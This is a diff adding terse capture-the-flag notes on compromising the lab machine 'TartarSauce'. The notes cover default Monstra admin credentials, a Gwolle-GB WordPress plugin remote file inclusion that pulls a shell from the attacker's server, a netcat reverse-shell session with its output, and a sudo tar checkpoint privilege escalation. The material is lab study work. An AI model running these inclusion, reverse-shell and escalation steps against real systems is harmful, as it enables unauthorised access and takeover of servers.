@@ -1,0 +1,47 @@
+
+
+
+http://10.10.10.88/webservices/monstra-3.0.4/admin/
+
+Default creds
+admin:admin
+
+The Monsta 3.0.4 vuln is working, files are not uploading. Pivot to a WP addon exploit.
+
+http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.2/shell.txt
+
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.88 - - [12/Aug/2025 22:34:53] code 404, message File not found
+10.10.10.88 - - [12/Aug/2025 22:34:53] "GET /shell.txtwp-load.php HTTP/1.0" 404 -
+10.10.10.88 - - [12/Aug/2025 22:35:44] "GET /shell.txtwp-load.php HTTP/1.0" 200 -
+
+
+┌──(kali㉿kali)-[~]
+└─$ mv shell.txt shell.txtwp-load.php
+                                        
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.88] 57054
+ls
+ajaxresponse.php
+index.html
+ȜӎŗgͷͼȜ_5h377
+whoami
+www-data
+sudo -l
+Matching Defaults entries for www-data on TartarSauce:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on TartarSauce:
+    (onuma) NOPASSWD: /bin/tar
+sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+whoami
+onuma
+
